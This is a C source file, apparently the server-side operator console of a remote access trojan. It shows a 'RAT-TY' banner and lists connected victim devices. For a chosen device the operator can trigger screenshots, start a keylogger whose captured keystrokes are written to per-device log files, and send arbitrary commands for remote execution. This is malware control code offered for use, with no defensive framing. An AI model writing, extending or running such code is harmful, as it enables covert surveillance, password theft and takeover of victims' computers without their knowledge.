#include "serverInterface.h"
#include "constraints.h"
#include "messageManager.h"
#include "utils.h"
#include "serverManager.h"
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <termios.h>
#include <string.h>
#include <sys/select.h>
#include <sys/epoll.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <pthread.h>

extern clientHandler_t clientHndler;

// Functii pentru configurarea terminalului
void initTerminal()
{
    struct termios new_tio;
    tcgetattr(STDIN_FILENO, &new_tio);
    new_tio.c_lflag &= ~(ICANON | ECHO); // Dezactivează modul canon și eco
    new_tio.c_cc[VMIN] = 1;              // Citește cel puțin 1 caracter
    new_tio.c_cc[VTIME] = 0;             // Fără timeout
    tcsetattr(STDIN_FILENO, TCSANOW, &new_tio);
}

void resetTerminal()
{
    struct termios default_tio;
    tcgetattr(STDIN_FILENO, &default_tio);
    default_tio.c_lflag |= (ICANON | ECHO); // Reactivează modul canon și eco
    tcsetattr(STDIN_FILENO, TCSANOW, &default_tio);
}

// Funcție pentru afișarea dispozitivelor conectate
int printConectedDevices(int *poz)
{
    int nrDeviceuri = 0;
    char nume_deviceuri[MAX_CLIENTS][BUFFER_SIZE];

    for (int i = 0; i < clientHndler.numberClients; i++)
    {
        strcpy(nume_deviceuri[nrDeviceuri++], clientHndler.clientsAttr[clientHndler.socketsClients[i]].name);
    }

    if (*poz >= nrDeviceuri && *poz > 0)
    {
        *poz = nrDeviceuri - 1;
    }

    printf("\n\n\tDevices: \n");
    for (int i = 0; i < nrDeviceuri; i++)
    {
        if (*poz == i)
            printf("\t\t  %s <--\n", nume_deviceuri[i]);
        else
            printf("\t\t%s \n", nume_deviceuri[i]);
    }
    return nrDeviceuri;
}

// Funcție pentru gestionarea unui client specific
void *userManagement(int clientNr)
{
    char numeDevice[30];
    strcpy(numeDevice, clientHndler.clientsAttr[clientHndler.socketsClients[clientNr]].name);
    int clientSock = clientHndler.socketsClients[clientNr];
    int exit = 0;
    message_t scr_msg;
    char BUF[SEND_BUFFER_SIZE];

    while (1)
    {
        system("clear");
        printf("\tClient: %s\n", numeDevice);
        printf("\t\t->  take screenshot; press s\n");
        printf("\t\t->  stop/start keylog; press k\n");
        printf("\t\t->  enter cmd; press c\n");
        printf("\t\texit press q\n");

        fd_set read_fds;
        FD_ZERO(&read_fds);
        FD_SET(STDIN_FILENO, &read_fds);
        char filename[BUFFER_SIZE];
        struct timeval timeout = {0, 100000}; // Timeout de 100ms
        int ready = select(STDIN_FILENO + 1, &read_fds, NULL, NULL, &timeout);

        if (ready > 0 && FD_ISSET(STDIN_FILENO, &read_fds))
        {
            char ch = getchar();
            switch (ch)
            {
            case 'q':
                exit = 1;
                break;
            case 's':
                strcpy(BUF, "");
                encapsulateMessage(&scr_msg, BUF, 'S');
                sendMessage(clientSock, &scr_msg);
                break;
            case 'k':
                strcpy(BUF, "");
                encapsulateMessage(&scr_msg, BUF, 'K');
                sendMessage(clientSock, &scr_msg);
                snprintf(filename, sizeof(filename), "%s/keylog%s.txt", clientHndler.clientsAttr[clientSock].name, clientHndler.clientsAttr[clientSock].name);

                mkdir(clientHndler.clientsAttr[clientSock].name, 0755);

                clientHndler.clientsAttr[clientSock].keylogger_fd = open(filename, O_CREAT | O_APPEND | O_WRONLY, 0664);
                clientHndler.clientsAttr[clientSock].recordKeys = 1;
                break;
            case 'c':
            {
                // Temporarily enable ECHO and ICANON for standard input behavior
                struct termios original_tio, new_tio;
                tcgetattr(STDIN_FILENO, &original_tio);
                new_tio = original_tio;
                new_tio.c_lflag |= (ECHO | ICANON); // Enable ECHO and ICANON
                tcsetattr(STDIN_FILENO, TCSANOW, &new_tio);

                // Clear the terminal and get user input
                system("clear");
                printf("Enter command here:\n\t");

                // Read input manually to handle backspace
                int pos = 0;
                char ch;
                while (1)
                {
                    ch = getchar(); // Read a single character

                    if (ch == '\n')
                    { // Enter key pressed
                        BUF[pos] = '\0';
                        break;
                    }
                    else if (ch == 127 || ch == '\b')
                    { // Backspace key
                        if (pos > 0)
                        {
                            pos--;
                            printf("\b \b"); // Move back, overwrite with space, and move back again
                        }
                    }
                    else if (pos < sizeof(BUF) - 1)
                    { // Normal character
                        BUF[pos++] = ch;
                        putchar(ch); // Echo the character
                    }
                }

                // Disable ECHO and ICANON again
                tcsetattr(STDIN_FILENO, TCSANOW, &original_tio);

                // Encapsulate and send the message
                message_t scr_msg;
                encapsulateMessage(&scr_msg, BUF, 'C');
                sendMessage(clientSock, &scr_msg);

                break;
            }
            default:
                break;
            }
        }

        if (exit == 1)
            break;
    }

    return NULL;
}

// Interfața serverului
void *serverInterface()
{
    int poz = 0;
    initTerminal();

    while (1)
    {
        system("clear");
        printf("\t██████╗  █████╗ ████████╗   ████████╗██       ██╗\n");
        printf("\t██╔══██╗██╔══██╗ ╚═██╔══╝    ╚═██╔══╝╚██     ██╔╝\n");
        printf("\t██████╔╝███████║   ██║   ███   ██║    ╚██   ██╔╝\n");
        printf("\t██╔══██╗██╔══██║   ██║         ██║     ╚██ ██╔╝   \n");
        printf("\t██║  ██║██║  ██║   ██║         ██║      ╚██╔╝   \n");
        printf("\t╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝         ╚═╝       ╚═╝   \n");

        int nrDev = printConectedDevices(&poz);

        fd_set read_fds;
        FD_ZERO(&read_fds);
        FD_SET(STDIN_FILENO, &read_fds);

        struct timeval timeout = {0, 100000}; // Timeout de 100ms
        int ready = select(STDIN_FILENO + 1, &read_fds, NULL, NULL, &timeout);

        if (ready > 0 && FD_ISSET(STDIN_FILENO, &read_fds))
        {
            char ch1 = getchar();
            if (ch1 == '\n' && nrDev > 0)
            {
                userManagement(poz);
                continue;
            }

            char ch = getchar(); // Citește direcția
            if (ch == 'A' && poz > 0)
            { // Săgeata sus
                poz--;
            }
            else if (ch == 'B')
            { // Săgeata jos
                poz++;
            }
        }
    }

    resetTerminal();
    return NULL;
}
